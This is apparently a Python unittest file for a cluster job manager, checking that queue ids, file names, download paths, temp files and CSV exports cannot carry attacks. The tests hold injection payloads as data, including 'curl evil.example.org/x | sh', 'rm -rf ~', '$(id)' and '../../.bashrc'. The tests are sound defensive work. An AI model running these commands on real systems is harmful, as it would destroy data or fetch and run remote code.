"""The ways a string from elsewhere could act on the user's behalf.

Most were found by reviewing the code that opening a job list newly reaches: a
`.pmejbs` file can come from a colleague or a backup, so every field in a job
record is attacker-controlled once the user opens one.

1. The queue id was interpolated into a remote shell command unquoted, so
   `12345; rm -rf ~` in a job record became a command the user's own account ran
   on the cluster when they pressed Cancel -- and the helper queue's own entry,
   which is a path built inside the command and so cannot be quoted at all.
2. File names in the remote directory listing were joined straight onto the
   local download directory, so a remote host answering `../../.bashrc` wrote
   outside it.
3. An input file's name is substituted into the command line for `{input}`,
   so `mol$(id).inp` ran `id` on the host.
4. Working copies went to a predictable name in the shared temp directory,
   which another user on the machine can create first.
5. An exported CSV is opened in a spreadsheet by somebody who did not write it.
"""

import csv
import os
import tempfile
import unittest

from job_manager import remote_runner, remote_runner_ps, runner
from job_manager import store as store_module
from job_manager.models import MODE_RUNNER, Job, SubmitPreset
from job_manager.schedulers import get_scheduler
from job_manager.store import JobStore

from .fakes import FakeTransport, make_host

INJECTIONS = (
    "12345; rm -rf ~/important",
    "1 && curl evil.example.org/x | sh",
    "$(id)",
    "`id`",
    "1 | tee /tmp/x",
    "1\nrm -rf ~",
)


class TestTheQueueIdCannotCarryACommand(unittest.TestCase):
    def test_every_scheduler_quotes_it(self):
        for name in ("slurm", "pbs", "sge", "shell"):
            scheduler = get_scheduler(name)
            for payload in INJECTIONS:
                command = scheduler.cancel_command(payload)
                with self.subTest(scheduler=name, payload=payload):
                    # The dangerous character must never sit outside quotes.
                    self.assertNotIn(f" {payload}", command)
                    self.assertIn("'", command)

    def test_an_ordinary_id_is_left_readable(self):
        self.assertEqual(get_scheduler("slurm").cancel_command("12345"), "scancel 12345")
        self.assertEqual(get_scheduler("sge").cancel_command("987"), "qdel 987")

    def test_a_pbs_style_id_with_a_host_suffix_survives(self):
        self.assertEqual(
            get_scheduler("pbs").cancel_command("123.head.cluster"), "qdel 123.head.cluster"
        )

    def test_the_shell_scheduler_quotes_both_uses(self):
        command = get_scheduler("shell").cancel_command("12345; id")
        self.assertEqual(command.count("'12345; id'"), 2)

    def test_cancel_sends_the_quoted_form(self):
        host = make_host(scheduler="slurm")
        transport = FakeTransport(host)
        job = Job(id="j1", remote_job_id="12345; rm -rf ~")
        runner.cancel_job(transport, host, job)
        sent = transport.commands[-1]
        self.assertIn("'12345; rm -rf ~'", sent)
        self.assertNotIn("scancel 12345; rm", sent)


class TestTheHelperQueueEntryCannotCarryACommand(unittest.TestCase):
    """The same id, on the one path that cannot quote it.

    A runner entry is half of a path built *inside* the command
    (``mv "queue/$entry"``), so quoting it is not available -- it is checked
    against the shape :func:`remote_runner.entry_name` writes instead. Both
    flavours, because the bash one interpolated it raw while the PowerShell
    one quoted, and a guarantee that holds in one shell is not a guarantee.
    """

    FLAVOURS = (remote_runner, remote_runner_ps)
    BUILDERS = ("cancel_command", "release_command", "enqueue_command")

    def test_an_entry_that_is_not_ours_is_refused(self):
        payloads = INJECTIONS + (
            "job_0001_x$(id > /tmp/pwned).sh",
            'job_0001_a"; id; #',
            "job_0001_a`id`.sh",
            "../../../etc/passwd",
            "",
        )
        for flavour in self.FLAVOURS:
            for builder in self.BUILDERS:
                for payload in payloads:
                    with self.subTest(flavour=flavour.__name__, cmd=builder, payload=payload):
                        with self.assertRaises(remote_runner.UnsafeEntry):
                            getattr(flavour, builder)("~/jobs/.moleditpy_runner", payload)

    def test_a_real_entry_still_works(self):
        entry = remote_runner.entry_name(7, "a1b2c3d4e5f6")
        self.assertEqual(entry, "job_0007_a1b2c3d4e5f6.sh")
        for builder in self.BUILDERS:
            command = getattr(remote_runner, builder)("~/jobs/.moleditpy_runner", entry)
            self.assertIn(entry, command)
        ps_entry = remote_runner.entry_name(7, "a1b2c3d4e5f6", ".ps1")
        for builder in self.BUILDERS:
            command = getattr(remote_runner_ps, builder)("~/jobs", ps_entry)
            self.assertIn(ps_entry, command)

    def test_cancelling_a_crafted_job_sends_nothing(self):
        host = make_host(scheduler="shell", concurrency_mode=MODE_RUNNER)
        self.assertTrue(host.uses_remote_runner)
        transport = FakeTransport(host)
        job = Job(id="j1", remote_job_id="job_0001_x$(rm -rf ~).sh")

        with self.assertRaises(remote_runner.UnsafeEntry):
            runner.cancel_in_runner(transport, host, job)
        self.assertEqual(transport.commands, [])

    def test_a_job_that_never_queued_is_not_an_error(self):
        host = make_host(scheduler="shell", concurrency_mode=MODE_RUNNER)
        transport = FakeTransport(host)

        runner.cancel_in_runner(transport, host, Job(id="j1", remote_job_id=""))
        runner.release_in_runner(transport, host, Job(id="j2", remote_job_id=""))
        self.assertEqual(transport.commands, [])


class TestDownloadsStayInTheirDirectory(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="download_safety_")
        # Nested so that "../.." from the download directory still lands inside
        # this test's own temp tree, never in the shared temp directory.
        self.local = os.path.join(self.tmp, "a", "b", "results")
        self.host = make_host()

    def test_a_traversing_name_is_rejected(self):
        for name in ("../../.bashrc", "../x", "/etc/passwd", "sub/dir.out", "..", "."):
            with self.subTest(name=name):
                self.assertEqual(runner.safe_download_name(name), "")

    def test_a_backslash_path_is_rejected(self):
        self.assertEqual(runner.safe_download_name(r"..\..\evil.bat"), "")
        self.assertEqual(runner.safe_download_name(r"C:\windows\x"), "")

    def test_ordinary_names_pass(self):
        for name in ("mol.out", "job.log", "a b.xyz", "run-1.hess", ".hidden"):
            self.assertEqual(runner.safe_download_name(name), name)

    def test_the_listing_drops_them(self):
        transport = FakeTransport(self.host).when(
            "ls -p -1", stdout="mol.out\n../../.bashrc\n/etc/passwd\nsub/\njob.log\n"
        )
        self.assertEqual(runner.list_remote_files(transport, "~/jobs/1"), ["mol.out", "job.log"])

    def test_nothing_is_written_outside_the_download_directory(self):
        transport = FakeTransport(self.host).when("ls -p -1", stdout="mol.out\n../../.bashrc\n")
        job = Job(id="j1", remote_dir="~/jobs/1", log_file="job.log", fetch_globs=["*"])
        runner.fetch_results(transport, job, self.local)
        inside = os.path.abspath(self.local) + os.sep
        for _remote, local_path in transport.downloads:
            self.assertTrue(
                os.path.abspath(local_path).startswith(inside),
                f"{local_path} is outside {self.local}",
            )
        # And the traversal target itself was never created, wherever it lands.
        self.assertFalse(os.path.exists(os.path.abspath(os.path.join(self.local, "../../.bashrc"))))

    def test_the_legitimate_file_still_arrives(self):
        transport = FakeTransport(self.host).when("ls -p -1", stdout="mol.out\n../../.bashrc\n")
        job = Job(id="j1", remote_dir="~/jobs/1", log_file="job.log", fetch_globs=["*.out"])
        downloaded = runner.fetch_results(transport, job, self.local)
        self.assertEqual([os.path.basename(p) for p in downloaded], ["mol.out"])


class TestAFileNameCannotCarryACommand(unittest.TestCase):
    """``{input}`` is substituted into the command line as it stands.

    It has to be: a template is free to write ``"{input}"`` and quote it
    itself, so quoting here would double it. That leaves the name, which the
    user did not necessarily choose -- an input can arrive by email or from a
    shared directory -- so a name that would act as syntax is refused instead.
    """

    def test_a_name_that_would_run_something_is_refused(self):
        for name in ("mol$(id).inp", "mol`id`.inp", "a;rm -rf ~.inp", "a|sh.inp", 'a".inp'):
            with self.subTest(name=name):
                with self.assertRaises(ValueError):
                    runner.check_input_name(name)

    def test_an_ordinary_name_is_not(self):
        # A space is not syntax -- `"{input}"` handles it -- and a glob can
        # only ever name another file in the same directory.
        for name in ("mol.inp", "my mol.inp", "a[1].inp", "mol-2.opt.inp", ""):
            with self.subTest(name=name):
                runner.check_input_name(name)

    def test_nothing_is_uploaded_for_a_refused_name(self):
        host = make_host()
        transport = FakeTransport(host)
        job = Job(id="j1", name="a")
        preset = SubmitPreset(command_template="orca {input} > {stem}.out")

        with self.assertRaises(ValueError):
            runner.submit_job(transport, host, preset, job, ["/tmp/mol$(id).inp"])
        self.assertEqual(transport.uploads, [])
        self.assertEqual(transport.commands, [])

    def test_the_remote_input_name_is_checked_too(self):
        job = Job(id="j1", remote_input="mol`id`.inp")
        with self.assertRaises(ValueError):
            runner.input_name_for(job, [])


class TestWorkingCopiesStayOutOfTheSharedTempDirectory(unittest.TestCase):
    """A fetched result and a relayed input are the user's data.

    Both used to be written under ``tempfile.gettempdir()`` at a name another
    user on the same machine could predict -- so they could create it first as
    a symlink and choose where the write landed, and read whatever arrived.
    """

    def test_the_cache_is_under_the_data_directory(self):
        tmp = tempfile.mkdtemp(prefix="workdirs_")
        store = JobStore(tmp)

        path = store.cache_dir("a1b2c3d4", create=True)
        self.assertTrue(path.startswith(os.path.abspath(tmp)), path)
        self.assertTrue(os.path.isdir(path))
        if os.name != "nt":
            self.assertEqual(oct(os.stat(path).st_mode & 0o777), oct(0o700))

    def test_a_crafted_job_id_cannot_climb_out(self):
        tmp = tempfile.mkdtemp(prefix="workdirs_")
        store = JobStore(tmp)

        path = os.path.abspath(store.cache_dir("../../../etc"))
        self.assertTrue(path.startswith(os.path.abspath(tmp)), path)
        self.assertNotIn("..", path.split(os.sep))

    def test_a_relayed_input_lands_there_too(self):
        from job_manager import structure_relay

        tmp = tempfile.mkdtemp(prefix="relaysrc_")
        source = os.path.join(tmp, "run.inp")
        with open(source, "w", encoding="utf-8") as handle:
            handle.write("%oldchk=[prevfile:.chk]\n")
        job = Job(id="j1", name="prev", input_files=[os.path.join(tmp, "opt.inp")])

        written = structure_relay.materialize(source, job)
        root = os.path.abspath(store_module.work_path(structure_relay.RELAY_DIRNAME))
        self.assertTrue(os.path.abspath(written).startswith(root), written)


class TestAnExportedCsvIsNotAProgram(unittest.TestCase):
    """An export is made to be sent to somebody, and they open it in Excel."""

    def test_a_formula_cell_is_written_as_text(self):
        tmp = tempfile.mkdtemp(prefix="csvexport_")
        store = JobStore(tmp)
        store.add_job(Job(id="j1", name="=1+1", command="@SUM(A1)", last_error="-2+3"))
        target = os.path.join(tmp, "jobs.csv")

        store.export_jobs_csv(target)
        with open(target, encoding="utf-8") as handle:
            rows = list(csv.reader(handle))

        cells = rows[1]
        for written in ("'=1+1", "'@SUM(A1)", "'-2+3"):
            self.assertIn(written, cells)

    def test_ordinary_text_is_left_alone(self):
        self.assertEqual(store_module.csv_safe("mol.inp"), "mol.inp")
        self.assertEqual(store_module.csv_safe(""), "")
        self.assertEqual(store_module.csv_safe(None), "")


class TestOpeningAJobListCannotLeakSecrets(unittest.TestCase):
    """A job list is data, not configuration: it must not bring hosts with it."""

    def test_a_job_file_carries_no_host_or_password(self):
        tmp = tempfile.mkdtemp(prefix="joblist_")
        store = JobStore(tmp)
        store.add_job(Job(id="j1", name="a", preset=SubmitPreset().to_dict()))
        with open(store.jobs_path, encoding="utf-8") as handle:
            written = handle.read()
        for field in ("hostname", "username", "key_path", "password"):
            self.assertNotIn(f'"{field}"', written, field)


class TestTailPathsStayInsideTheJobDirectory(unittest.TestCase):
    def test_unsafe_log_name_is_not_sent_to_the_host(self):
        transport = FakeTransport(make_host())
        job = Job(remote_dir="~/jobs/1", log_file="../../secret")

        self.assertEqual(runner.tail_log(transport, job), "")
        self.assertEqual(transport.commands, [])

    def test_unsafe_selected_name_is_not_sent_to_the_host(self):
        transport = FakeTransport(make_host())
        job = Job(remote_dir="~/jobs/1")

        self.assertEqual(runner.tail_remote_file(transport, job, "/etc/passwd"), "")
        self.assertEqual(transport.commands, [])


if __name__ == "__main__":
    unittest.main()
